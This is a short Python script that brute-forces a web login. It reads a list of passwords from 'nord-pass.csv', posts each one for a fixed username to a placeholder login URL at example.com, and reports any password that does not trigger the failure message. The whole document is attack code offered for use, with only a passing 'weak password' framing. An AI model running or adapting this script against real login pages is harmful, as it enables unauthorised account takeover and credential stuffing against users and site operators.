import requests

# Define the URL of the login page
url = "http://example.com/login.php"

# read passwords from file nord-pass.csv and store in list using comma delimiter
with open('nord-pass.csv', 'r') as f:
    passwords = f.read().splitlines()
            

# Loop through each password and try to log in with it
for password in passwords:
    # Define the POST data for the login request
    data = {
        "username": "example_user",
        "password": password
    }
    
    # Send the login request and check if it was successful
    response = requests.post(url, data=data)
    if "Invalid username or password" not in response.text:
        print("Found weak password: " + password)
        
        # success
        
